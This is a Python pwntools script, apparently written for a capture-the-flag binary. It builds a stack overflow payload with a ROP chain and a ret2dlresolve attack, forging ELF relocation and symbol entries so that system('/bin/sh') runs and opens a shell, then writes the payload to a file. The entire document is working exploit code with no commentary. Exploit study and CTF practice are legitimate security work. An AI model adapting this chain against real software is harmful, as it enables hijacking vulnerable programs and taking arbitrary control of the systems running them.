from pwn import *

# gadgets
nop_gadget = 0x4010af
set_regs_for_read_gadget = 0x40113e
syscall_gadget = 0x401040
rdi_gadget = 0x4011f3
plt_start = 0x401020
return_addr = 0x4141414141414141

# dlresolve payload
fake_data_addr = 0x403e00
fake_data_len = 72
reloc_arg = 0x266
binsh_addr = 0x403e40
got_entry_after_read = 0x4033a8

# Stage 1

exploit = b"A" * 64 # buffer
exploit += b"A" * 8 # rbp
exploit += p64(nop_gadget)
exploit += p64(nop_gadget)
exploit += p64(nop_gadget)

exploit += p64(set_regs_for_read_gadget)
exploit += p64(0) # stdin_fileno
exploit += p64(fake_data_addr) # buffer
exploit += p64(fake_data_len) # buffer len
exploit += p64(syscall_gadget) # read

exploit += p64(rdi_gadget)
exploit += p64(binsh_addr)
exploit += p64(plt_start)
exploit += p64(reloc_arg)
exploit += p64(return_addr)
exploit += p64(binsh_addr)

exploit += p64(0x0) # padding
exploit += p64(0x0) # padding

exploit += p64(got_entry_after_read) # Elf64_Rela.r_offset
exploit += p32(0x7) # Elf64_Rela.r_info low
exploit += p32(0x271) # Elf64_Rela.r_info high

exploit += p32(0x3a50) # Elf64_Sym.st_name
exploit += p8(0x0)
exploit += p8(0x0)
exploit += p16(0x0)
exploit += p64(0x0)
exploit += p64(0x0)

exploit += b"system\x00\x00"
exploit += b"/bin/sh\x00"

with open("wer", "wb") as f:
    f.write(exploit)

